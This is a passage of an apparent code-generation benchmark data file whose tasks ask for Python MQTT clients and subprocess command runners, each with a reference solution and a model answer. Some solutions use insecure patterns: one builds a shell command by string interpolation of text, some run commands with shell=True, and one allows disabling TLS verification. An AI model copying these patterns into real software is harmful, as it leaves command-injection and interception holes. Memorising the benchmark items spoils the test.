message: {e}\")\n\n    def start(self) -> None:\n        self.client.connect(self.host, self.port, 60)\n        self.client.loop_forever()\n\n    def custom_command(self, command: str) -> None:\n        print(f\"Processing custom command: {command}\")\n\n    def buttonsinglepress(self) -> None:\n        print(\"Button single press detected\")"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a Python function that establishes an MQTT client connection, subscribes to specified topics, and continuously processes incoming messages using callback functions.\n\nFunction Description: The function `wait_for_messages` initializes an MQTT client, sets up a message callback handler, subscribes to predefined topics, and enters an infinite loop to process incoming MQTT messages. It handles different message types through topic-specific callback functions.\n\nInput: None (The function uses predefined configuration and topics internally)\n\nOutput: None (The function runs indefinitely, processing messages through callbacks)\n\n---\n\nTask Description: Create a helper function to initialize and configure an MQTT client with WebSocket transport.\n\nFunction Description: The function `get_client` creates and configures an MQTT client instance with WebSocket transport, sets authentication credentials, and establishes an asynchronous connection to the broker.\n\nInput: None (Uses hardcoded connection parameters)\n\nOutput: paho.mqtt.client.Client - Returns a configured MQTT client instance\n\n---\n\nTask Description: Create a callback function to handle incoming MQTT messages and route them to appropriate handlers based on topic.\n\nFunction Description: The function `on_message_callback` processes incoming MQTT messages, logs receipt, and routes them to specific handler functions based on topic patterns. It includes error handling for message processing.\n\nInput:\n- client: paho.mqtt.client.Client - The MQTT client instance\n- userdata: Any - User-defined data passed to the callback\n- message: paho.mqtt.client.MQTTMessage - The received message object\n\nOutput: None (Messages are processed through side effects in handler functions)",
    "Canonical_solution": "import json\nimport logging\nimport paho.mqtt.client as paho\n\ndef get_client():\n    mqtt_client = paho.Client(transport=\"websockets\", client_id=\"listener\")\n    mqtt_client.enable_logger()\n    mqtt_client.username_pw_set(username=\"tavern\", password=\"tavern\")\n    mqtt_client.connect_async(host=\"broker\", port=9001)\n    return mqtt_client\n\ndef on_message_callback(client, userdata, message):\n    try:\n        logging.info(\"Received message on %s\", message.topic)\n\n        if \"devices/status\" in message.topic:\n            handle_full_status_topic(client, message)\n        elif \"lights\" in message.topic:\n            handle_lights_topic(message)\n        elif \"echo\" in message.topic:\n            handle_echo_topic(client, message)\n        elif \"ping\" in message.topic:\n            handle_ping_topic(client, message)\n        elif \"status\" in message.topic:\n            handle_status_topic(client, message)\n        else:\n            logging.warning(\"Got unexpected MQTT topic '%s'\", message.topic)\n    except Exception as e:\n        logging.exception(\"error handling message: {}\".format(e))\n\ndef wait_for_messages():\n    mqtt_client = get_client()\n    mqtt_client.on_message = on_message_callback\n    mqtt_client.reconnect()\n\n    topics = [\"lights\", \"ping\", \"echo\", \"status\"]\n\n    for t in topics:\n        device_topic = \"/device/+/{}\".format(t)\n        logging.debug(\"Subscribing to '%s'\", device_topic)\n        mqtt_client.subscribe(device_topic)\n\n    mqtt_client.subscribe(\"/devices/status\")\n\n    mqtt_client.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nimport logging\nimport sys\nimport json\n\nlogging.basicConfig(level=logging.INFO)\n\ndef get_client():\n    client = mqtt.Client(client_id=\"websocket_client\", transport=\"websockets\")\n    client.username_pw_set(\"username\", \"password\")\n    try:\n        client.connect(\"broker.example.com\", 8080)\n    except Exception as e:\n        logging.error(f\"Connection failed: {e}\")\n        sys.exit(1)\n    return client\n\ntopic_handlers = {}\n\ndef register_handler(topic, handler):\n    topic_handlers[topic] = handler\n\ndef on_message_callback(client, userdata, message):\n    logging.info(f\"Message received on topic {message.topic}\")\n    try:\n        payload = json.loads(message.payload.decode())\n        for topic, handler in topic_handlers.items():\n            if message.topic == topic:\n                handler(client, userdata, payload)\n                break\n    except Exception as e:\n        logging.error(f\"Error processing message: {e}\")\n\ndef wait_for_messages():\n    client = get_client()\n    client.on_message = on_message_callback\n    \n    topics = [\"sensor/temperature\", \"sensor/humidity\"]\n    for topic in topics:\n        client.subscribe(topic)\n        logging.info(f\"Subscribed to {topic}\")\n        register_handler(topic, lambda c, u, p: print(f\"Received data: {p}\"))\n\n    try:\n        client.loop_forever()\n    except KeyboardInterrupt:\n        logging.info(\"Shutting down...\")\n        client.disconnect()"
  },
  {
    "Task_id": 272,
    "Instruction": "Task Description: Create a Python function that implements an MQTT subscriber using the Paho MQTT client library to connect to a broker, subscribe to topics, and continuously process incoming messages.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker, subscribes to specified topics, and enters a loop to continuously handle incoming messages. It includes logging for debugging purposes.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity, but could be parameterized if needed.)\n\nOutput: None (The function runs indefinitely, processing incoming messages and logging events.)",
    "Canonical_solution": "import logging\nimport paho.mqtt.client as mqtt\n\ndef mqtt_subscriber():\n    logging.basicConfig(level=logging.DEBUG)\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    logger = logging.getLogger(__name__)\n    mqttc.enable_logger(logger)\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.subscribe(\"$SYS/#\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nimport logging\n\ndef mqtt_subscriber():\n    broker_address = \"broker.hivemq.com\"\n    broker_port = 1883\n    topic = \"test/topic\"\n\n    client = mqtt.Client(client_id=\"PythonSubscriber\")\n\n    logging.basicConfig(level=logging.DEBUG)\n    \n    def on_connect(client, userdata, flags, rc):\n        if rc == 0:\n            logging.info(\"Connected successfully to broker\")\n            client.subscribe(topic)\n        else:\n            logging.error(f\"Failed to connect, return code {rc}\")\n\n    def on_message(client, userdata, msg):\n        if msg.topic == topic:\n            logging.info(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n\n    def on_subscribe(client, userdata, mid, granted_qos):\n        logging.debug(f\"Subscribed to topic with QoS {granted_qos}\")\n\n    def on_disconnect(client, userdata, rc):\n        if rc != 0:\n            logging.warning(\"Unexpected disconnection from broker\")\n\n    client.on_connect = on_connect\n    client.on_message = on_message\n    client.on_subscribe = on_subscribe\n    client.on_disconnect = on_disconnect\n\n    try:\n        client.connect(broker_address, broker_port, 60)\n        client.loop_forever()\n    except Exception as e:\n        logging.error(f\"Error occurred during connection or operation: {e}\")\n        client.disconnect()"
  },
  {
    "Task_id": 273,
    "Instruction": "Task Description: Implement an MQTT subscriber in Python that connects to a broker, subscribes to topics, and processes incoming messages with different callback functions for specific topic patterns.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker, sets up message callbacks for specific topic patterns, subscribes to a wildcard topic, and continuously processes incoming messages. It uses the Paho MQTT client library to handle MQTT communication.\n\nInput: None (The broker address and port are hardcoded in the function)\n\nOutput: None (The function prints incoming messages to the console but does not return any value)\n\nMethods:\n\nMethod1: on_message_msgs(mosq, obj, msg) -> None - Callback function that handles messages matching the topic pattern \"$SYS/broker/messages/#\". Prints message details to the console.\nMethod2: on_message_bytes(mosq, obj, msg) -> None - Callback function that handles messages matching the topic pattern \"$SYS/broker/bytes/#\". Prints message details to the console.\nMethod3: on_message(mosq, obj, msg) -> None - Default callback function that handles all other messages not caught by specific callbacks. Prints message details to the console.\nMethod4: mqtt_subscriber() -> None - Main function that creates an MQTT client, sets up callbacks, connects to the broker, subscribes to topics, and starts the message processing loop.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_message_msgs(mosq, obj, msg):\n    print(\"MESSAGES: \" + msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_message_bytes(mosq, obj, msg):\n    print(\"BYTES: \" + msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_message(mosq, obj, msg):\n    print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef mqtt_subscriber():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    mqttc.message_callback_add(\"$SYS/broker/messages/#\", on_message_msgs)\n    mqttc.message_callback_add(\"$SYS/broker/bytes/#\", on_message_bytes)\n    mqttc.on_message = on_message\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.subscribe(\"$SYS/#\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\n\ndef on_message_msgs(mosq, obj, msg):\n    print(f\"Messages topic: {msg.topic}, QoS: {msg.qos}, Payload: {msg.payload}\")\n\ndef on_message_bytes(mosq, obj, msg):\n    print(f\"Bytes topic: {msg.topic}, QoS: {msg.qos}, Payload: {msg.payload}\")\n\ndef on_message(mosq, obj, msg):\n    print(f\"Other message - Topic: {msg.topic}, QoS: {msg.qos}, Payload: {msg.payload}\")\n\ndef mqtt_subscriber():\n    client = mqtt.Client()\n    client.on_message = on_message\n    client.connect(\"mqtt.eclipse.org\", 1883, 60)\n    \n    client.message_callback_add(\"$SYS/broker/messages/#\", on_message_msgs)\n    client.message_callback_add(\"$SYS/broker/bytes/#\", on_message_bytes)\n    \n    client.subscribe(\"$SYS/#\", qos=0)\n    \n    client.loop_forever()"
  },
  {
    "Task_id": 274,
    "Instruction": "Task Description: Implement an MQTT consumer class in Python that connects to an MQTT broker, subscribes to topics, and handles incoming messages, with optional authentication support.\n\nClass Description: The MQTTConsumer class provides functionality to connect to an MQTT broker, subscribe to topics, and process incoming messages. It includes callbacks for connection events, message reception, and message publishing. The class supports optional username/password authentication.\n\nAttributes:\n- final_mid: [int] - Stores the message ID of the final message to be published\n- client: [paho.mqtt.client.Client] - The MQTT client instance used for communication\n\nMethods:\n- __init__(client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None) -> None - Initializes the MQTT client with connection parameters and optional authentication\n- on_connect(mqttc, userdata, flags, reason_code, properties) -> None - Callback for when the client connects to the broker\n- on_message(mqttc, userdata, msg) -> None - Callback for when a message is received on a subscribed topic\n- on_publish(mqttc, userdata, mid, reason_code, properties) -> None - Callback for when a message is published\n- subscribe(topic) -> None - Subscribes to the specified topic\n- start_consuming() -> None - Starts the MQTT loop to process network traffic and messages continuously",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\nclass MQTTConsumer:\n    def __init__(self, client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None):\n        self.final_mid = 0\n        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id)\n        self.client._userdata = False\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_publish = self.on_publish\n        \n        if username:\n            self.client.username_pw_set(username, password)\n        self.client.connect(host, port, keepalive)\n\n    def on_connect(self, mqttc, userdata, flags, reason_code, properties):\n        if userdata:\n            print(f\"reason_code: {reason_code}\")\n\n    def on_message(self, mqttc, userdata, msg):\n        if msg.retain == 0:\n            pass\n        else:\n            if userdata:\n                print(\"Clearing topic \" + msg.topic)\n            (rc, self.final_mid) = mqttc.publish(msg.topic, None, 1, True)\n\n    def on_publish(self, mqttc, userdata, mid, reason_code, properties):\n        if mid == self.final_mid:\n            sys.exit()\n\n    def subscribe(self, topic):\n        self.client.subscribe(topic)\n\n    def start_consuming(self):\n        self.client.loop_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\n\nclass MQTTConsumer:\n    def __init__(self, client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None):\n        self.final_mid = None\n        self.client = mqtt.Client(client_id=client_id)\n        if username and password:\n            self.client.username_pw_set(username, password)\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_publish = self.on_publish\n        self.client.connect(host, port, keepalive)\n\n    def on_connect(self, mqttc, userdata, flags, reason_code, properties):\n        pass\n\n    def on_message(self, mqttc, userdata, msg):\n        pass\n\n    def on_publish(self, mqttc, userdata, mid, reason_code, properties):\n        pass\n\n    def subscribe(self, topic):\n        self.client.subscribe(topic)\n\n    def start_consuming(self):\n        self.client.loop_forever()"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Implement an MQTT subscriber client in Python using the Paho MQTT library to connect to a broker, subscribe to topics, and handle incoming messages.\n\nFunction Description: The function `mqtt_subscribe` establishes a connection to an MQTT broker, subscribes to specified topics, and continuously listens for incoming messages. It utilizes callback functions to handle connection events, subscription acknowledgments, and incoming messages.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity, but could be parameterized for flexibility.)\n\nOutput: None (The function prints connection status, subscription acknowledgments, and received messages to the console.)\n\n---\n\nTask Description: Create a Python class that encapsulates MQTT subscriber functionality using the Paho MQTT library, allowing for connection to a broker, topic subscription, and message handling.\n\nClass Description: The `MQTTSubscriber` class provides methods to connect to an MQTT broker, subscribe to topics, and process incoming messages. It uses callback methods to handle connection events, subscription acknowledgments, and message reception.\n\nAttributes:\n\n- `client`: [mqtt.Client] - The MQTT client instance used for communication with the broker.\n- `broker_address`: [str] - The address of the MQTT broker to connect to.\n- `broker_port`: [int] - The port number of the MQTT broker.\n- `topic`: [str] - The topic to subscribe to for receiving messages.\n\nMethods:\n\n- `__init__(self, broker_address: str, broker_port: int, topic: str) -> None` - Initializes the MQTT subscriber with broker details and subscription topic.\n- `on_connect(self, mqttc, obj, flags, reason_code, properties) -> None` - Callback for when the client connects to the broker.\n- `on_message(self, mqttc, obj, msg) -> None` - Callback for when a message is received on a subscribed topic.\n- `on_subscribe(self, mqttc, obj, mid, reason_code_list, properties) -> None` - Callback for when the client subscribes to a topic.\n- `connect_and_subscribe(self) -> None` - Connects to the broker and subscribes to the specified topic.\n- `start(self) -> None` - Starts the MQTT loop to process network traffic and messages.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \" + str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_subscribe(mqttc, obj, mid, reason_code_list, properties):\n    print(\"Subscribed: \" + str(mid) + \" \" + str(reason_code_list))\n\ndef mqtt_subscribe():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_subscribe = on_subscribe\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.subscribe(\"$SYS/#\")\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nclass MQTTSubscriber:\n    def __init__(self, broker_address: str, broker_port: int, topic: str) -> None:\n        self.client = mqtt.Client(protocol=mqtt.MQTTv5)\n        self.broker_address = broker_address\n        self.broker_port = broker_port\n        self.topic = topic\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        print(f\"Connected to MQTT Broker with result code {reason_code}\")\n    def on_message(self, mqttc, obj, msg):\n        if msg.topic == self.topic:\n            payload = msg.payload.decode('utf-8')\n            print(f\"Received message on topic '{msg.topic}': {payload}\")\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(f\"Subscribed to topic with mid {mid} and QoS {reason_code_list[0].qos}\")\n    def connect_and_subscribe(self) -> None:\n        self.client.connect(self.broker_address, self.broker_port)\n        self.client.subscribe(self.topic)\n    def start(self) -> None:\n        self.connect_and_subscribe()\n        self.client.loop_forever()"
  },
  {
    "Task_id": 276,
    "Instruction": "Task Description: Implement a Python function that publishes messages to an MQTT broker using the Paho MQTT client library, with support for TLS/SSL encryption and authentication.\n\nFunction Description: The function `mqtt_publisher` establishes a connection to an MQTT broker, publishes a specified number of messages to a given topic at a defined interval, and handles connection events and message publishing callbacks. It supports optional TLS/SSL encryption, username/password authentication, and various MQTT QoS levels.\n\nInput:\n- `host` (str): The hostname or IP address of the MQTT broker.\n- `topic` (str): The MQTT topic to publish messages to.\n- `qos` (int): The Quality of Service level (0, 1, or 2) for message delivery.\n- `clientid` (str): The client ID to use when connecting to the broker.\n- `username` (str, optional): The username for broker authentication.\n- `disable_clean_session` (bool, optional): If True, the broker will maintain session state for the client.\n- `password` (str, optional): The password for broker authentication.\n- `port` (int, optional): The port number to connect to (defaults to 1883 for non-TLS, 8883 for TLS).\n- `nummsgs` (int): The number of messages to publish.\n- `delay` (float): The delay in seconds between publishing messages.\n- `keepalive` (int): The keepalive interval in seconds for the connection.\n- `use_tls` (bool, optional): If True, enable TLS/SSL encryption.\n- `insecure` (bool, optional): If True, disable certificate verification.\n- `cacerts` (str, optional): Path to CA certificate file for TLS/SSL.\n- `tls_version` (str, optional): The TLS version to use (\"tlsv1\", \"tlsv1.1\", or \"tlsv1.2\").\n- `debug` (bool, optional): If True, enable debug logging.\n\nOutput: None. The function publishes messages to the MQTT broker and prints status information to the console.",
    "Canonical_solution": "import argparse\nimport os\nimport ssl\nimport time\nimport paho.mqtt.client as mqtt\n\ndef mqtt_publisher(host, topic, qos, clientid, username, disable_clean_session, password, port, nummsgs, delay, keepalive, use_tls, insecure, cacerts, tls_version, debug):\n    usetls = use_tls\n    if cacerts:\n        usetls = True\n\n    if port is None:\n        if usetls:\n            port = 8883\n        else:\n            port = 1883\n\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, clientid, clean_session = not disable_clean_session)\n\n    if usetls:\n        if tls_version == \"tlsv1.2\":\n            tlsVersion = ssl.PROTOCOL_TLSv1_2\n        elif tls_version == \"tlsv1.1\":\n            tlsVersion = ssl.PROTOCOL_TLSv1_1\n        elif tls_version == \"tlsv1\":\n            tlsVersion = ssl.PROTOCOL_TLSv1\n        elif tls_version is None:\n            tlsVersion = None\n        else:\n            print(\"Unknown TLS version - ignoring\")\n            tlsVersion = None\n\n        if not insecure:\n            cert_required = ssl.CERT_REQUIRED\n        else:\n            cert_required = ssl.CERT_NONE\n\n        mqttc.tls_set(ca_certs=cacerts, certfile=None, keyfile=None, cert_reqs=cert_required, tls_version=tlsVersion)\n\n        if insecure:\n            mqttc.tls_insecure_set(True)\n\n    if username or password:\n        mqttc.username_pw_set(username, password)\n\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_publish = on_publish\n\n    if debug:\n        mqttc.on_log = on_log\n\n    print(\"Connecting to \"+host+\" port: \"+str(port))\n    mqttc.connect(host, port, keepalive)\n\n    mqttc.loop_start()\n\n    for x in range (0, nummsgs):\n        msg_txt = '{\"msgnum\": \"'+str(x)+'\"}'\n        print(\"Publishing: \"+msg_txt)\n        infot = mqttc.publish(topic, msg_txt, qos=qos)\n        infot.wait_for_publish()\n\n        time.sleep(delay)\n\n    mqttc.disconnect()",
    "Code_level": "Function-level",
    "FSMID_for_test": 83,
    "right_result": "import paho.mqtt.client as mqtt\nimport time\nimport ssl\n\ndef on_connect(client, userdata, flags, rc):\n    if rc == 0:\n        print(\"Connected successfully.\")\n    else:\n        print(f\"Failed to connect, return code {rc}\")\n\ndef on_publish(client, userdata, mid):\n    print(f\"Message ID {mid} published.\")\n\ndef on_disconnect(client, userdata, rc):\n    print(f\"Disconnected with result code {rc}\")\n\ndef mqtt_publisher(host, topic, qos, clientid, username=None, disable_clean_session=False, password=None,\n                  port=1883, nummsgs=5, delay=1.0, keepalive=60, use_tls=False, insecure=False,\n                  cacerts=None, tls_version=None, debug=False):\n    \n    client = mqtt.Client(client_id=clientid, clean_session=not disable_clean_session)\n    \n    if username and password:\n        client.username_pw_set(username, password)\n    \n    if debug:\n        client.enable_logger()\n    \n    client.on_connect = on_connect\n    client.on_publish = on_publish\n    client.on_disconnect = on_disconnect\n    \n    if use_tls:\n        tls_params = {}\n        if cacerts:\n            tls_params['ca_certs'] = cacerts\n        if tls_version:\n            if tls_version == \"tlsv1\":\n                tls_params['tls_version'] = ssl.PROTOCOL_TLSv1\n            elif tls_version == \"tlsv1.1\":\n                tls_params['tls_version'] = ssl.PROTOCOL_TLSv1_1\n            elif tls_version == \"tlsv1.2\":\n                tls_params['tls_version'] = ssl.PROTOCOL_TLSv1_2\n        if insecure:\n            tls_params['cert_reqs'] = ssl.CERT_NONE\n        client.tls_set(**tls_params)\n        client.tls_insecure_set(insecure)\n\n    try:\n        client.connect(host, port, keepalive)\n        client.loop_start()\n        \n        for i in range(nummsgs):\n            msg = f\"Message {i+1}/{nummsgs}\"\n            client.publish(topic, msg, qos=qos)\n            time.sleep(delay)\n        \n        client.disconnect()\n        client.loop_stop()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")"
  },
  {
    "Task_id": 277,
    "Instruction": "Task Description: Create a Python function that establishes an MQTT client connection to a broker, publishes messages to specified topics with a given QoS level, and handles connection and message events asynchronously.\n\nFunction Description: The function `mqtt_publish` initializes an MQTT client, sets up callback functions for connection, message reception, and message publishing events, connects to a specified MQTT broker, starts an asynchronous network loop, and publishes messages to designated topics with a QoS level of 2. The function demonstrates basic MQTT publishing capabilities with event handling.\n\nInput: None (The function uses hardcoded values for broker address, port, topics, and messages)\n\nOutput: None (The function's effects are side-effects: publishing messages and printing status information through callback functions)\n\nNote: The function includes three callback functions:\n1. `on_connect`: Prints the connection reason code when connected to the broker\n2. `on_message`: Prints received messages (though none are expected in this publish-only example)\n3. `on_publish`: Prints the message ID when a message is published",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \" + str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_publish(mqttc, obj, mid, reason_code, properties):\n    print(\"mid: \" + str(mid))\n\ndef mqtt_publish():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_publish = on_publish\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.loop_start()\n    (rc, mid) = mqttc.publish(\"tuple\", \"bar\", qos=2)\n    infot = mqttc.publish(\"class\", \"bar\", qos=2)\n    infot.wait_for_publish()",
    "Code_level": "Function-level",
    "FSMID_for_test": 83,
    "right_result": "import paho.mqtt.client as mqtt\n\ndef mqtt_publish():\n    client = mqtt.Client(client_id=\"publisher\")\n\n    def on_connect(clnt, userdata, flags, rc):\n        print(f\"Connected with result code {rc}\")\n\n    def on_message(clnt, userdata, msg):\n        print(f\"Received message on topic {msg.topic}: {msg.payload.decode()}\")\n\n    def on_publish(clnt, userdata, mid):\n        print(f\"Message published with ID {mid}\")\n\n    client.on_connect = on_connect\n    client.on_message = on_message\n    client.on_publish = on_publish\n\n    broker_address = \"broker.hivemq.com\"\n    broker_port = 1883\n    client.connect(broker_address, broker_port)\n\n    client.loop_start()\n\n    topics = [\"test/topic1\", \"test/topic2\"]\n    messages = [\"Hello from publisher\", \"Another message\"]\n\n    for topic, message in zip(topics, messages):\n        client.publish(topic, message, qos=2)\n\n    import time\n    time.sleep(5)\n    client.loop_stop()\n    client.disconnect()"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a function to execute system commands using subprocess with pipe-based inter-process communication in Python.\n\nFunction Description: The function should run a system command in a new process, capture its output and error streams, and optionally return a boolean indicating success/failure instead of the output. It should use subprocess.PIPE for communication between processes.\n\nInput:\n- cmd: [str] - The system command to be executed\n- is_ok: [bool] (optional, default=False) - Flag to determine return type (True/False for success/failure if True, output/error if False)\n\nOutput:\n- If is_ok=True: [bool] - Returns True if command executed successfully (returncode=0), False otherwise\n- If is_ok=False: [tuple] - Returns a tuple containing (output, error) as bytes objects from stdout and stderr respectively",
    "Canonical_solution": "import subprocess\n\ndef run_cmd(cmd, is_ok=False):\n    \"\"\"\n    Run cmd\n    \"\"\"\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,\n                         shell=True, executable='/bin/bash')\n\n    output, err = p.communicate()\n    if is_ok:\n        if p.returncode == 0:\n            return True\n        else:\n            return False\n\n    return output, err",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef run_command(cmd, is_ok=False):\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    output, error = process.communicate()\n    if is_ok:\n        return process.returncode == 0\n    else:\n        return (output, error)"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a function to execute system commands and handle input/output communication between processes using pipes.\n\nFunction Description: The function `runCmd` executes a system command in a subprocess and facilitates communication via pipes. It can handle both cases where input data is provided to the subprocess and where no input is required. The function captures the standard output, standard error, and return code of the executed command.\n\nInput:\n- `cmd`: [List or String] - The command to be executed, either as a list of arguments or a single string.\n- `data`: [Bytes, optional] - Input data to be sent to the subprocess's standard input. Defaults to None if no input is required.\n\nOutput:\n- A tuple containing:\n  - `stdout`: [String] - The decoded standard output of the command.\n  - `stderr`: [String] - The decoded standard error of the command.\n  - `returncode`: [Integer] - The return code of the executed command.",
    "Canonical_solution": "import sys\nimport subprocess\n\ndef runCmd(cmd, data=None):\n    if input is None:\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n    else:\n        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate(input=data)\n\n    return stdout.decode('utf-8'), stderr.decode('utf-8'), p.returncode",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef runCmd(cmd, data=None):\n    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate(input=data)\n    return (stdout.decode() if stdout else '', stderr.decode() if stderr else '', process.returncode)"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that runs a Python subprocess with pipe communication, compares the output with expected results from a JSON file, and asserts their equality.\n\nFunction Description: The function `run_subprocess_with_pipe` executes a Python subprocess with given arguments, captures its output through a pipe, and compares this output with expected results loaded from a JSON file. The comparison includes checking the length of the results and verifying that all elements match between the expected and actual outputs.\n\nInput:\n- `expected_file`: [str] - Path to the JSON file containing the expected output data.\n- `*args`: [variable arguments] - Additional command-line arguments to pass to the subprocess.\n\nOutput: None (The function performs assertions to validate the output against the expected results. If assertions fail, an AssertionError is raised.)",
    "Canonical_solution": "import sys\nimport subprocess\nimport json\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    dg = subprocess.Popen([sys.executable] + list(args), stdout=subprocess.PIPE)\n    stdout, _ = dg.communicate()\n    expected = json.load(open(expected_file))\n    result = json.loads(stdout.decode())\n    \n    assert len(expected) == len(result)\n    assert all(r in result for r in expected)\n    assert all(r in expected for r in result)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport json\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    process = subprocess.Popen(['python'] + list(args), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    stdout, stderr = process.communicate()\n    with open(expected_file, 'r') as f:\n        expected_data = json.load(f)\n    actual_output = stdout.strip().splitlines()\n    assert len(actual_output) == len(expected_data), f\"Expected {len(expected_data)} lines, got {len(actual_output)}\"\n    for act, exp in zip(actual_output, expected_data):\n        assert act == exp, f\"Expected '{exp}', got '{act}'\""
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: The task involves creating Python functions that utilize subprocess and pipes to execute shell commands and handle their input/output streams. The functions should be able to run commands directly or filter text through commands in a shell environment.\n\nFunction Description: \n\n1. `run_and_read`: Executes a shell command and captures its standard output and error streams, then returns the decoded output (prioritizing stdout over stderr if available).\n\n2. `filter_region`: Takes a text input, pipes it through a shell command (using the system's default shell or a specified shell), and returns the processed output from the command.\n\nInput:\n\n- For `run_and_read`:\n  - `view`: (object) - A view object (contextual, typically from an editor/IDE)\n  - `cmd`: (str) - The shell command to execute\n\n- For `filter_region`:\n  - `view`: (object) - A view object (contextual, typically from an editor/IDE)\n  - `text`: (str) - The text to be processed by the command\n  - `command`: (str) - The shell command to process the text\n\nOutput:\n\n- For `run_and_read`: (str) - The decoded output from the command (stdout if available, otherwise stderr)\n- For `filter_region`: (str) - The decoded output from the command after processing the input text",
    "Canonical_solution": "import os\nimport subprocess\nfrom subprocess import PIPE\n\ndef run_and_read(view, cmd):\n    out, err = subprocess.Popen([cmd],\n            stdout=PIPE,\n            stderr=PIPE,\n            shell=True).communicate()\n    try:\n        return (out or err).decode('utf-8')\n    except AttributeError:\n        return ''\n\ndef filter_region(view, text, command):\n    shell = view.settings().get('VintageousEx_linux_shell')\n    shell = shell or os.path.expandvars(\"$SHELL\")\n    p = subprocess.Popen([shell, '-c', 'echo \"%s\" | %s' % (text, command)],\n             stderr=subprocess.PIPE,\n             stdout=subprocess.PIPE)\n    return p.communicate()[0][:-1].decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
